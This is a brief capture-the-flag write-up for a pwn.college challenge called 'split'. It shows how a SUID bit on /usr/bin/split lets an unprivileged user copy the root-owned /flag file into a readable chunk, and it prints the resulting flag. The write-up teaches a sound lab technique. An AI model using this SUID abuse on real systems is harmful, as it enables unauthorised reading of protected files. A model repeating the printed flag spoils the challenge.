# Challenge Name: split

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/split`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/split
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/split
```

-The `s` in `-rws` indicates it's a SUID binary.
-`split` runs with **root privileges**.

## 🚀 Exploitation

The `split` command in Linux is used to divide a file into smaller chunks, either by:

- number of lines,

- byte size,

- number of pieces.

So,
```bash
split /flag
```
simply create files with 1000 lines per file, in our case it would simply just create a file containing our flag

Output:
```
ls 
xaa
cat xaa
pwn.college{ERFwaR7mfWZjdw0CB78tEoCU2sY.dhTNxwSM0IzMyEzW}
```
